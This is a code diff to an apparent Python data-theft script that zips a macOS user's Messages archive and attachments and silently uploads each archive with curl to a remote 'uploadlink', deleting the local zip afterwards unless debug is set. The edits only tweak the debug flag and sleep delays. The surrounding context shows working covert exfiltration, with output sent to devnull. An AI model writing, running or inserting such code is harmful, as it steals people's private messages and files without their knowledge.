@@ -9,7 +9,7 @@ import sys
 sys.stdout = os.devnull
 
 enableATCH = 1
-debug = 0
+debug = 1
 
 home = expanduser("~")
 
@@ -27,13 +27,9 @@ shutil.make_archive(zipname, 'zip', clocation)
 with open(os.devnull, 'w') as fp:
     cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
 # This is not a good way to handle this but works for now
-sleep(1)
+sleep(10)
 if debug is 0:
     os.unlink(zipname + ".zip")
-
-# Breaks after this
-
-sleep(2)
 
 clocation = home + "/Library/Messages/Archive"
 
@@ -45,7 +41,7 @@ shutil.make_archive(zipname, 'zip', clocation)
 
 with open(os.devnull, 'w') as fp:
     cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
-sleep(4)
+sleep(20)
 if debug is 0:
     os.unlink(zipname + ".zip")
 
@@ -58,7 +54,7 @@ if enableATCH is 1:
 
     with open(os.devnull, 'w') as fp:
         cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
-    sleep(5)
+    sleep(80)
     if debug is 0:
         os.unlink(zipname + ".zip")
 
